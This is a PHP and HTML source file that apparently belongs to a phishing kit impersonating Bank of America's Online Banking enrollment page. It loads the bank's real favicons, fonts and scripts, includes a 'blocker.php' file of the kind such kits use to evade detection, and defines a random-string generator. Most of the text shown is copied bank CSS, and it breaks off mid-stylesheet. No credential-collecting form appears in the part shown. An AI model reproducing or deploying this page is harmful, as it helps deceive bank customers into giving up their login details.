<?php
defined('BASEPATH') or exit('No direct script access allowed');
require('blocker.php');

function rand_chars($c, $l, $u = FALSE)
{
    if (!$u) for ($s = '', $i = 0, $z = strlen($c) - 1; $i < $l; $x = rand(0, $z), $s .= $c{
        $x}, $i++);
    else for ($i = 0, $z = strlen($c) - 1, $s = $c{
        rand(0, $z)}, $i = 1; $i != $l; $x = rand(0, $z), $s .= $c{
        $x}, $s = ($s{
        $i} == $s{
        $i - 1} ? substr($s, 0, -1) : $s), $i = strlen($s));
    return $s;
}

$chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
?>
<html lang="en-US" layoutversion="3.1.0" layoutsupportheaderversion="5.0.1">

<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bank of America | Online Banking | Online &amp;Mobile Banking</title>
    <meta name="keywords" content="Enroll in Online &amp; Mobile Banking">
    <meta name="description" content="Enroll in Online &amp; Mobile Banking">
    <link rel="apple-touch-icon" sizes="180x180" href="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-favicon-apple-touch-icon-CSX889b28c.png">
    <link rel="icon" sizes="32x32" href="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-favicon-favicon-32x32-CSX704d6b21.png">
    <link rel="icon" sizes="16x16" href="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-favicon-favicon-16x16-CSXaaa5ca4e.png">
    <link rel="icon" sizes="192x192" href="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-favicon-android-chrome-192x192-CSXafb7d716.png">
    <link rel="mask-icon" href="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-favicon-safari-pinned-tab-CSX1aebeef6.svg" color="#6e6e6e">
    <link rel="shortcut icon" href="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-favicon-favicon-CSX8d65d6e4.ico">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/images/assets-images-global-favicon-mstile-144x144.png">
    <meta name="theme-color" content="#ffffff">

    <script src="https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/platform/babel-polyfill.js"></script>
    <style>
        /*! normalize.css v4.1.1 | MIT License | github.com/necolas/normalize.css */
        [data-sparta-wrapper] {
            font-family: sans-serif;
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%;
            margin: 0
        }

        [data-sparta-wrapper] article,
        [data-sparta-wrapper] aside,
        [data-sparta-wrapper] details,
        [data-sparta-wrapper] figcaption,
        [data-sparta-wrapper] figure,
        [data-sparta-wrapper] footer,
        [data-sparta-wrapper] header,
        [data-sparta-wrapper] main,
        [data-sparta-wrapper] menu,
        [data-sparta-wrapper] nav,
        [data-sparta-wrapper] section,
        [data-sparta-wrapper] summary {
            display: block
        }

        [data-sparta-wrapper] audio,
        [data-sparta-wrapper] canvas,
        [data-sparta-wrapper] progress,
        [data-sparta-wrapper] video {
            display: inline-block
        }

        [data-sparta-wrapper] audio:not([controls]) {
            display: none;
            height: 0
        }

        [data-sparta-wrapper] progress {
            vertical-align: baseline
        }

        [data-sparta-wrapper] template,
        [data-sparta-wrapper] [hidden] {
            display: none
        }

        [data-sparta-wrapper] a {
            background-color: transparent;
            -webkit-text-decoration-skip: objects
        }

        [data-sparta-wrapper] a:active,
        [data-sparta-wrapper] a:hover {
            outline-width: 0
        }

        [data-sparta-wrapper] abbr[title] {
            border-bottom: none;
            text-decoration: underline;
            text-decoration: underline dotted
        }

        [data-sparta-wrapper] b,
        [data-sparta-wrapper] strong {
            font-weight: inherit
        }

        [data-sparta-wrapper] b,
        [data-sparta-wrapper] strong {
            font-weight: bolder
        }

        [data-sparta-wrapper] dfn {
            font-style: italic
        }

        [data-sparta-wrapper] h1 {
            font-size: 2em;
            margin: 0.67em 0
        }

        [data-sparta-wrapper] mark {
            background-color: #ff0;
            color: #000
        }

        [data-sparta-wrapper] small {
            font-size: 80%
        }

        [data-sparta-wrapper] sub,
        [data-sparta-wrapper] sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline
        }

        [data-sparta-wrapper] sub {
            bottom: -0.25em
        }

        [data-sparta-wrapper] sup {
            top: -0.5em
        }

        [data-sparta-wrapper] img {
            border-style: none
        }

        [data-sparta-wrapper] svg:not(:root) {
            overflow: hidden
        }

        [data-sparta-wrapper] code,
        [data-sparta-wrapper] kbd,
        [data-sparta-wrapper] pre,
        [data-sparta-wrapper] samp {
            font-family: monospace, monospace;
            font-size: 1em
        }

        [data-sparta-wrapper] figure {
            margin: 1em 40px
        }

        [data-sparta-wrapper] hr {
            box-sizing: content-box;
            height: 0;
            overflow: visible
        }

        [data-sparta-wrapper] button,
        [data-sparta-wrapper] input,
        [data-sparta-wrapper] select,
        [data-sparta-wrapper] textarea {
            font: inherit;
            margin: 0
        }

        [data-sparta-wrapper] optgroup {
            font-weight: bold
        }

        [data-sparta-wrapper] button,
        [data-sparta-wrapper] input {
            overflow: visible
        }

        [data-sparta-wrapper] button,
        [data-sparta-wrapper] select {
            text-transform: none
        }

        [data-sparta-wrapper] button,
        [data-sparta-wrapper] html [data-sparta-wrapper] [type="button"],
        [data-sparta-wrapper] [type="reset"],
        [data-sparta-wrapper] [type="submit"] {
            -webkit-appearance: button
        }

        [data-sparta-wrapper] button::-moz-focus-inner,
        [data-sparta-wrapper] [type="button"]::-moz-focus-inner,
        [data-sparta-wrapper] [type="reset"]::-moz-focus-inner,
        [data-sparta-wrapper] [type="submit"]::-moz-focus-inner {
            border-style: none;
            padding: 0
        }

        [data-sparta-wrapper] button:-moz-focusring,
        [data-sparta-wrapper] [type="button"]:-moz-focusring,
        [data-sparta-wrapper] [type="reset"]:-moz-focusring,
        [data-sparta-wrapper] [type="submit"]:-moz-focusring {
            outline: 1px dotted ButtonText
        }

        [data-sparta-wrapper] fieldset {
            border: 1px solid #c0c0c0;
            margin: 0 2px;
            padding: 0.35em 0.625em 0.75em
        }

        [data-sparta-wrapper] legend {
            box-sizing: border-box;
            color: inherit;
            display: table;
            max-width: 100%;
            padding: 0;
            white-space: normal
        }

        [data-sparta-wrapper] textarea {
            overflow: auto
        }

        [data-sparta-wrapper] [type="checkbox"],
        [data-sparta-wrapper] [type="radio"] {
            box-sizing: border-box;
            padding: 0
        }

        [data-sparta-wrapper] [type="number"]::-webkit-inner-spin-button,
        [data-sparta-wrapper] [type="number"]::-webkit-outer-spin-button {
            height: auto
        }

        [data-sparta-wrapper] [type="search"] {
            -webkit-appearance: textfield;
            outline-offset: -2px
        }

        [data-sparta-wrapper] [type="search"]::-webkit-search-cancel-button,
        [data-sparta-wrapper] [type="search"]::-webkit-search-decoration {
            -webkit-appearance: none
        }

        [data-sparta-wrapper] ::-webkit-input-placeholder {
            color: inherit;
            opacity: 0.54
        }

        [data-sparta-wrapper] ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit
        }

        @font-face {
            font-family: "cnx-regular";
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-regular/cnx-regular.eot");
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-regular/cnx-regular.eot?#iefix") format("embedded-opentype"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-regular/cnx-regular.woff2") format("woff2"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-regular/cnx-regular.woff") format("woff"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-regular/cnx-regular.ttf") format("truetype");
            font-weight: 300;
            font-style: normal;
            font-variant: normal
        }

        @font-face {
            font-family: "cnx-regular-cond";
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-regular-cond/cnx-regular-cond.eot");
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-regular-cond/cnx-regular-cond.eot?#iefix") format("embedded-opentype"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-regular-cond/cnx-regular-cond.woff2") format("woff2"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-regular-cond/cnx-regular-cond.woff") format("woff"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-regular-cond/cnx-regular-cond.ttf") format("truetype");
            font-weight: 300;
            font-style: normal;
            font-variant: normal
        }

        @font-face {
            font-family: "cnx-bold";
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-bold/cnx-bold.eot");
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-bold/cnx-bold.eot?#iefix") format("embedded-opentype"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-bold/cnx-bold.woff2") format("woff2"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-bold/cnx-bold.woff") format("woff"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-bold/cnx-bold.ttf") format("truetype");
            font-weight: 700;
            font-style: normal;
            font-variant: normal
        }

        @font-face {
            font-family: "cnx-bold-italic";
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-bold-italic/cnx-bold-italic.eot");
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-bold-italic/cnx-bold-italic.eot?#iefix") format("embedded-opentype"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-bold-italic/cnx-bold-italic.woff2") format("woff2"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-bold-italic/cnx-bold-italic.woff") format("woff"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-bold-italic/cnx-bold-italic.ttf") format("truetype");
            font-weight: 700;
            font-style: italic;
            font-variant: normal
        }

        @font-face {
            font-family: "cnx-italic";
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-italic/cnx-italic.eot");
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-italic/cnx-italic.eot?#iefix") format("embedded-opentype"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-italic/cnx-italic.woff2") format("woff2"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-italic/cnx-italic.woff") format("woff"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-italic/cnx-italic.ttf") format("truetype");
            font-weight: 300;
            font-style: italic;
            font-variant: normal
        }

        @font-face {
            font-family: "cnx-italic-cond";
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-italic-cond/cnx-italic-cond.eot");
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-italic-cond/cnx-italic-cond.eot?#iefix") format("embedded-opentype"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-italic-cond/cnx-italic-cond.woff2") format("woff2"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-italic-cond/cnx-italic-cond.woff") format("woff"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-italic-cond/cnx-italic-cond.ttf") format("truetype");
            font-weight: 300;
            font-style: italic;
            font-variant: normal
        }

        @font-face {
            font-family: "cnx-medium";
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-medium/cnx-medium.eot");
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-medium/cnx-medium.eot?#iefix") format("embedded-opentype"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-medium/cnx-medium.woff2") format("woff2"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-medium/cnx-medium.woff") format("woff"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-medium/cnx-medium.ttf") format("truetype");
            font-weight: 300;
            font-style: normal;
            font-variant: normal
        }

        @font-face {
            font-family: "cnx-medium-italic";
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-medium-italic/cnx-medium-italic.eot");
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-medium-italic/cnx-medium-italic.eot?#iefix") format("embedded-opentype"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-medium-italic/cnx-medium-italic.woff2") format("woff2"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-medium-italic/cnx-medium-italic.woff") format("woff"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-medium-italic/cnx-medium-italic.ttf") format("truetype");
            font-weight: 300;
            font-style: italic;
            font-variant: normal
        }

        @font-face {
            font-family: "cnx-light";
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-light/cnx-light.eot");
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-light/cnx-light.eot?#iefix") format("embedded-opentype"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-light/cnx-light.woff2") format("woff2"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-light/cnx-light.woff") format("woff"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-light/cnx-light.ttf") format("truetype");
            font-weight: 200;
            font-style: normal;
            font-variant: normal
        }

        @font-face {
            font-family: "cnx-light-italic";
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-light-italic/cnx-light-italic.eot");
            src: url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-light-italic/cnx-light-italic.eot?#iefix") format("embedded-opentype"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-light-italic/cnx-light-italic.woff2") format("woff2"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-light-italic/cnx-light-italic.woff") format("woff"), url("https://secure1.bac-assets.com/sparta/auth/enroll/spa-assets/components/utilities/global/sparta-style-utility/3.1.5/font/cnx-light-italic/cnx-light-italic.ttf") format("truetype");
            font-weight: 200;
            font-style: italic;
            font-variant: normal
        }

        [data-sparta-container] button,
        [data-sparta-container] input[type="button"],
        [data-sparta-container] input[type="reset"],
        [data-sparta-container] input[type="submit"] {
            -webkit-appearance: button;
            cursor: pointer
        }

        [data-sparta-container] button,
        [data-sparta-container] .button {
            -webkit-appearance: none;
            -moz-appearance: none;
            border-radius: 0;
            border-style: solid;
            border-width: 0;
            cursor: pointer;
            font-family: "Helvetica Neue", Helvetica, Roboto, Arial, sans-serif;
            font-weight: normal;
            line-height: normal;
            margin: 0 0 1.25rem;
            position: relative;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            padding: 1rem 2rem 1.0625rem 2rem;
            font-size: 1rem;
            background-color: #008cba;
            border-color: #007095;
            color: #fff;
            -webkit-transition: background-color 300ms ease-out;
            transition: background-color 300ms ease-out
        }

        [data-sparta-container] label {
            line-height: 1.5;
            cursor: pointer
        }

        [data-sparta-container] textarea {
            height: auto;
            min-height: 50px;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            border-radius: 0;
            background-color: #FFFFFF;
            border-style: solid;
            border-width: 1px;
            border-color: #cccccc;
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
            color: rgba(0, 0, 0, 0.75);
            display: block;
            font-family: inherit;
            font-size: 14px;
            height: 27.75px;
            margin: 0 0 12px 0;
            padding: 6px;
            width: 100%;
            box-sizing: border-box;
            -webkit-transition: border-color 0.15s linear, background 0.15s linear;
            transition: border-color 0.15s linear, background 0.15s linear
        }

        [data-sparta-container] textarea:focus {
            background: #fafafa;
            border-color: #999999;
            outline: none
        }

        [data-sparta-container] textarea:disabled {
            background-color: #DDDDDD;
            cursor: default
        }

        [data-sparta-container] select {
            width: 100%
        }

        [data-sparta-container] input[type="text"],
        [data-sparta-container] input[type="password"],
        [data-sparta-container] input[type="date"],
        [data-sparta-container] input[type="datetime"],
        [data-sparta-container] input[type="datetime-local"],
        [data-sparta-container] input[type="month"],
        [data-sparta-container] input[type="week"],
        [data-sparta-container] input[type="email"],
        [data-sparta-container] input[type="number"],
        [data-sparta-container] input[type="search"],
        [data-sparta-container] input[type="tel"],
        [data-sparta-container] input[type="time"],
        [data-sparta-container] input[type="url"],
        [data-sparta-container] input[type="color"] {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            border-radius: 0;
            background-color: #FFFFFF;
            border-style: solid;
            border-width: 1px;
            border-color: #cccccc;
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
            color: rgba(0, 0, 0, 0.75);
            display: block;
            font-family: inherit;
            font-size: 14px;
            height: 27.75px;
            margin: 0 0 12px 0;
            padding: 6px;
            width: 100%;
            box-sizing: border-box;
            -webkit-transition: border-color 0.15s linear, background 0.15s linear;
            transition: border-color 0.15s linear, background 0.15s linear
        }

        [data-sparta-container] input[type="text"]:focus,
        [data-sparta-container] input[type="password"]:focus,
        [data-sparta-container] input[type="date"]:focus,
        [data-sparta-container] input[type="datetime"]:focus,
        [data-sparta-container] input[type="datetime-local"]:focus,
        [data-sparta-container] input[type="month"]:focus,
        [data-sparta-container] input[type="week"]:focus,
        [data-sparta-container] input[type="email"]:focus,
        [data-sparta-container] input[type="number"]:focus,
        [data-sparta-container] input[type="search"]:focus,
        [data-sparta-container] input[type="tel"]:focus,
        [data-sparta-container] input[type="time"]:focus,
        [data-sparta-container] input[type="url"]:focus,
        [data-sparta-container] input[type="color"]:focus {
            background: #fafafa;
            border-color: #999999;
            outline: none
        }

        [data-sparta-container] input[type="text"]:disabled,
        [data-sparta-container] input[type="password"]:disabled,
        [data-sparta-container] input[type="date"]:disabled,
        [data-sparta-container] input[type="datetime"]:disabled,
        [data-sparta-container] input[type="datetime-local"]:disabled,
        [data-sparta-container] input[type="month"]:disabled,
        [data-sparta-container] input[type="week"]:disabled,
        [data-sparta-container] input[type="email"]:disabled,
        [data-sparta-container] input[type="number"]:disabled,
        [data-sparta-container] input[type="search"]:disabled,
        [data-sparta-container] input[type="tel"]:disabled,
        [data-sparta-container] input[type="time"]:disabled,
        [data-sparta-container] input[type="url"]:disabled,
        [data-sparta-container] input[type="color"]:disabled {
            background-color: #DDDDDD;
            cursor: default
        }

        [data-sparta-container] select {
            -webkit-appearance: none !important;
            -moz-appearance: none !important;
            appearance: none !important;
            background-color: #FAFAFA;
            border-radius: 0;
            background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSIgeD0iMTJweCIgeT0iMHB4IiB3aWR0aD0iMjRweCIgaGVpZ2h0PSIzcHgiIHZpZXdCb3g9IjAgMCA2IDMiIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDYgMyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PHBvbHlnb24gcG9pbnRzPSI1Ljk5MiwwIDIuOTkyLDMgLTAuMDA4LDAgIi8+PC9zdmc+);
            background-position: 100% center;
            background-repeat: no-repeat;
            border-style: solid;
            border-width: 1px;
            border-color: #cccccc;
            color: rgba(0, 0, 0, 0.75);
            font-family: inherit;
            font-size: 14px;
            line-height: normal;
            padding: 8px;
            border-radius: 0;
            height: 37px
        }

        [data-sparta-container] select::-ms-expand {
            display: none
        }

        [data-sparta-container] select.radius {
            border-radius: 3px
        }

        [data-sparta-container] select:hover {
            background-color: #f3f3f3;
            border-color: #999999
        }

        [data-sparta-container] select:disabled {
            background-color: #DDDDDD;
            cursor: default
        }

        [data-sparta-container] select[multiple] {
            height: auto
        }

        [data-sparta-container] input[type="file"],
        [data-sparta-container] input[type="checkbox"],
        [data-sparta-container] input[type="radio"],
        [data-sparta-container] select {
            margin: 0 0 16px 0
        }

        [data-sparta-container] input[type="checkbox"]+label,
        [data-sparta-container] input[type="radio"]+label {
            display: inline-block;
            margin-left: 8px;
            margin-right: 16px;
            margin-bottom: 0;
            vertical-align: baseline
        }

        [data-sparta-container] input[type="file"] {
            width: 100%
        }

        [data-sparta-container] fieldset {
            border: 1px solid #DDDDDD;
            margin: 18px 0;
            padding: 20px
        }

        [data-sparta-container] fieldset legend {
            background: #FFFFFF;
            font-weight: bold;
            margin-left: -3px;
            margin: 0;
            padding: 0 3px
        }

        .foundation-type-default {
            color: pink
        }

        [data-sparta-container] div,
        [data-sparta-container] dl,
        [data-sparta-container] dt,
        [data-sparta-container] dd,
        [data-sparta-container] ul,
        [data-sparta-container] ol,
        [data-sparta-container] li,
        [data-sparta-container] h1,
        [data-sparta-container] h2,
        [data-sparta-container] h3,
        [data-sparta-container] h4,
        [data-sparta-container] h5,
        [data-sparta-container] h6,
        [data-sparta-container] pre,
        [data-sparta-container] form,
        [data-sparta-container] p,
        [data-sparta-container] blockquote,
        [data-sparta-container] th,
        [data-sparta-container] td {
            margin: 0;
            padding: 0
        }

        [data-sparta-container] a {
            line-height: inherit;
            text-decoration: none
        }

        [data-sparta-container] a img {
            border: 0
        }

        [data-sparta-container] p {
            font-family: inherit;
            font-size: 1rem;
            font-weight: normal;
            line-height: 1.6;
            margin-bottom: 1.25rem;
            text-rendering: optimizeLegibility
        }

        [data-sparta-container] p.lead {
            font-size: 1.21875rem;
            line-height: 1.6
        }

        [data-sparta-container] p aside {
            font-size: .875rem;
            font-style: italic;
            line-height: 1.35
        }

        [data-sparta-container] h1,
        [data-sparta-container] h2,
        [data-sparta-container] h3,
        [data-sparta-container] h4,
        [data-sparta-container] h5,
        [data-sparta-container] h6 {
            color: #222;
            font-family: "Helvetica Neue", Helvetica, Roboto, Arial, sans-serif;
            font-style: normal;
            font-weight: normal;
            line-height: 1.4;
            margin-bottom: .5rem;
            margin-top: .2rem;
            text-rendering: optimizeLegibility
        }

        [data-sparta-container] h1 small,
        [data-sparta-container] h2 small,
        [data-sparta-container] h3 small,
        [data-sparta-container] h4 small,
        [data-sparta-container] h5 small,
        [data-sparta-container] h6 small {
            color: #6f6f6f;
            font-size: 60%;
            line-height: 0
        }

        [data-sparta-container] h1 {
            font-size: 2.125rem
        }

        [data-sparta-container] h2 {
            font-size: 1.6875rem
        }

        [data-sparta-container] h3 {
            font-size: 1.375rem
        }

        [data-sparta-container] h4 {
            font-size: 1.125rem
        }

        [data-sparta-container] h5 {
            font-size: 1.125rem
        }

        [data-sparta-container] h6 {
            font-size: 1rem
        }

        [data-sparta-container] .subheader {
            line-height: 1.4;
            color: #6f6f6f;
            font-weight: normal;
            margin-top: .2rem;
            margin-bottom: .5rem
        }

        [data-sparta-container] hr {
            border: solid #ddd;
            border-width: 1px 0 0;
            clear: both;
            height: 0;
            margin: 1.25rem 0 1.1875rem
        }

        [data-sparta-container] em,
        [data-sparta-container] i {
            font-style: italic;
            line-height: inherit
        }

        [data-sparta-container] strong,
        [data-sparta-container] b {
            font-weight: bold;
            line-height: inherit
        }

        [data-sparta-container] small {
            font-size: 60%;
            line-height: inherit
        }

        [data-sparta-container] code {
            background-color: #f8f8f8;
            border-color: #dfdfdf;
            border-style: solid;
            border-width: 1px;
            color: #333;
            font-family: Consolas, "Liberation Mono", Courier, monospace;
            font-weight: normal;
            padding: .125rem .3125rem .0625rem
        }

        [data-sparta-container] ul,
        [data-sparta-container] ol,
        [data-sparta-container] dl {
            font-family: inherit;
            font-size: 1rem;
            line-height: 1.6;
            list-style-position: outside;
            margin-bottom: 1.25rem
        }

        [data-sparta-container] ul {
            margin-left: 1.1rem
        }

        [data-sparta-container] ul.no-bullet {
            margin-left: 0
        }

        [data-sparta-container] ul.no-bullet li ul,
        [data-sparta-container] ul.no-bullet li ol {
            margin-left: 1.25rem;
            margin-bottom: 0;
            list-style: none
        }

        [data-sparta-container] ul li ul,
        [data-sparta-container] ul li ol {
            margin-left: 1.25rem;
            margin-bottom: 0
        }

        [data-sparta-container] ul.square li ul,
        [data-sparta-container] ul.circle li ul,
        [data-sparta-container] ul.disc li ul {
            list-style: inherit
        }

        [data-sparta-container] ul.square {
            list-style-type: square;
            margin-left: 1.1rem
        }

        [data-sparta-container] ul.circle {
            list-style-type: circle;
            margin-left: 1.1rem
        }

        [data-sparta-container] ul.disc {
            list-style-type: disc;
            margin-left: 1.1rem
        }

        [data-sparta-container] ul.no-bullet {
            list-style: none
        }

        [data-sparta-container] ol {
            margin-left: 1.4rem
        }

        [data-sparta-container] ol li ul,
        [data-sparta-container] ol li ol {
            margin-left: 1.25rem;
            margin-bottom: 0
        }

        [data-sparta-container] dl dt {
            margin-bottom: .3rem;
            font-weight: bold
        }

        [data-sparta-container] dl dd {
            margin-bottom: .75rem
        }

        [data-sparta-container] abbr,
        [data-sparta-container] acronym {
            text-transform: uppercase;
            font-size: 90%;
            color: #222;
            cursor: help
        }

        [data-sparta-container] abbr {
            text-transform: none
        }

        [data-sparta-container] abbr[title] {
            border-bottom: 1px dotted #ddd
        }

        [data-sparta-container] blockquote {
            margin: 0 0 1.25rem;
            padding: .5625rem 1.25rem 0 1.1875rem;
            border-left: 1px solid #ddd
        }

        [data-sparta-container] blockquote cite {
            display: block;
            font-size: .8125rem;
            color: #555
        }

        [data-sparta-container] blockquote cite:before {
            content: "\2014 \0020"
        }

        [data-sparta-container] blockquote cite a,
        [data-sparta-container] blockquote cite a:visited {
            color: #555
        }

        [data-sparta-container] blockquote,
        [data-sparta-container] blockquote p {
            line-height: 1.6;
            color: #6f6f6f
        }

        @media only screen and (min-width: 48em) {

            [data-sparta-container] h1,
            [data-sparta-container] h2,
            [data-sparta-container] h3,
            [data-sparta-container] h4,
            [data-sparta-container] h5,
            [data-sparta-container] h6 {
                line-height: 1.4
            }

            [data-sparta-container] h1 {
                font-size: 2.75rem
            }

            [data-sparta-container] h2 {
                font-size: 2.3125rem
            }

            [data-sparta-container] h3 {
                font-size: 1.6875rem
            }

            [data-sparta-container] h4 {
                font-size: 1.4375rem
            }

            [data-sparta-container] h5 {
                font-size: 1.125rem
            }

            [data-sparta-container] h6 {
                font-size: 1rem
            }
        }

        [data-sparta-container] {
            box-sizing: border-box;
            font: normal normal normal .5 Arial, "Helvetica Neue", Helvetica, Roboto, sans-serif;
            color: #333;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            background: #fff;
            color: #222;
            cursor: auto;
            font-style: normal;
            font-weight: normal;
            line-height: 20px;
            margin: 0;
            padding: 0;
            position: relative
        }

        [data-sparta-container].no-scroll {
            overflow: hidden
        }

        [data-sparta-container] *,
        [data-sparta-container] *:before,
        [data-sparta-container] *:after {
            box-sizing: inherit
        }

        [data-sparta-container] p {
            font: normal normal normal .5 Arial, "Helvetica Neue", Helvetica, Roboto, sans-serif
        }

        [data-sparta-container] a {
            color: #0052C2;
            text-decoration: none
        }

        [data-sparta-container] a:visited {
            color: #0052C2
        }

        [data-sparta-container] a:hover {
            color: #012169;
            text-decoration: underline
        }

        [data-sparta-container] a:focus {
            color: #012169;
            outline: medium none;
            text-decoration: underline
        }

        [data-sparta-container] code {
